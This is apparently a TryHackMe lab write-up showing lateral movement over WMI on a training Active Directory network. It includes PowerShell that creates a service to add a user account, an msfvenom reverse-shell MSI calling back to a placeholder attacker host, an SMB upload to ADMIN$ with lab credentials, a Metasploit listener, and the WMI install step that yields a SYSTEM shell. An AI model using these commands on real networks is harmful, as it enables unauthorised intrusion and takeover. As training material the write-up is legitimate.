# Moving Laterally Using WMI

Windows Management Instrumentation (WMI) allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways:

***

### <mark style="color:green;">Creating Services Remotely with WMI</mark>

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Administrators

Create service

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Start the service

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop and delete the service

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

***

### <mark style="color:green;">Installing MSI packages through WMI</mark>

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCERPC)
  * 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32\_Product class through WMI

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

***

***

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

## Task 2

Similar to the previous task, we need to move laterally from THMJMP2 to THMII but this time using MSI packages. Initial credentials are given (assume we captured with admin access)

User: `ZA.TRYHACKME.COM\t1_corine.waters`

Password: `Korine.1994`

***

Generate an MSI payload using this:

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f msi LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -o file.msi
```

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

Proceed to use the current user's credentials to upload the payload to the ADMIN$ share of THMIIS using `smbclient`

```bash
smbclient -c 'put file.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

Set the listener on Metasploit

```
msfconsole
msf6 exploit(multi/handler) > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT <ATTACKER_PORT>
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on <ATTACKER_IP>:<ATTACKER_PORT>
```

SSH into the DNS setup credentials

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Start a WMI session against THMIIS from a Powershell console:

```powershell
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Invoke the install method from Win32\_Product to trigger the payload

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\file.msi"; Options = ""; AllUsers = $false}
```

A callback is triggered. We are now SYSTEM and the pivot was successful

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Grab the flag

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>
